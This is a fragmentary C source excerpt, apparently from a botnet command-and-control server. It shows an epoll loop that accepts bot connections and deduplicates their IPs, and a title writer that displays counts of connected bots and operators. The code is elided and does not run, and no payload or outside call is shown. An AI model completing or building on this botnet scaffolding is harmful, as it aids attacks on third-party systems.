...
void *epollEventLoop(void *useless)
{
        ...
        int s;
        events = calloc (BOTS, sizeof event);
        while (1)
        {
                int n, i;
                n = epoll_wait (epollFD, events, BOTS, -1);
                for (i = 0; i < n; i++)
                {
                        ...
                        else if (listenFD == events[i].data.fd)
                        {
                                while (1)
                                {
                                        ...
                                        int dup = 0;
                                        for(ipIndex = 0; ipIndex < BOTS; ipIndex++)
                                        {
...
void *titleWriter(void *sock)
{
        ...
        while(1)
        {
                ...
                sprintf(string, "%c]0;Fortues connected: %d | Hellsec connected: %d%c", '\033', clientsConnected(), managesConnected, '\007');
